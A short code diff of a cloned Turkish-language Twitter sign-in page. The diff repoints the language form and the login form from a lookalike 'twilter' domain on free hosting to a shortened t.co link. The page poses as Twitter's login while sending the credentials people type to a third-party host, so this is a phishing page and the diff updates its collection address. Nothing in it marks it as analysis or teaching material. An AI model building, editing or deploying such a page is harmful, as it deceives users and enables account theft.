@@ -208,7 +208,7 @@ data-fouc-class-names="swift-loading"
         </ul>
       </div>
       <div class="js-front-language">
-        <form action="https://twilter-post-source.000webhostapp.com/" class="t1-form language" method="POST">
+        <form action="https://t.co/JYfxgAPF8m" class="t1-form language" method="POST">
           <input type="hidden" name="lang"> <input type="hidden" name="redirect">
           <input type="hidden" name="authenticity_token" value="becf3286d948dee9b86c86d98c09b08abdbb9647">
         </form>
@@ -293,7 +293,7 @@ data-fouc-class-names="swift-loading"
 
   <div class="signin-wrapper" data-login-message="">
     <h1>Twitter'a giriş yap</h1>
-    <form action="https://twilter-post-source.000webhostapp.com/" class="t1-form clearfix signin js-signin" method="POST">
+    <form action="https://t.co/JYfxgAPF8m" class="t1-form clearfix signin js-signin" method="POST">
       <fieldset>
 
   <legend class="visuallyhidden">Giriş yap</legend>
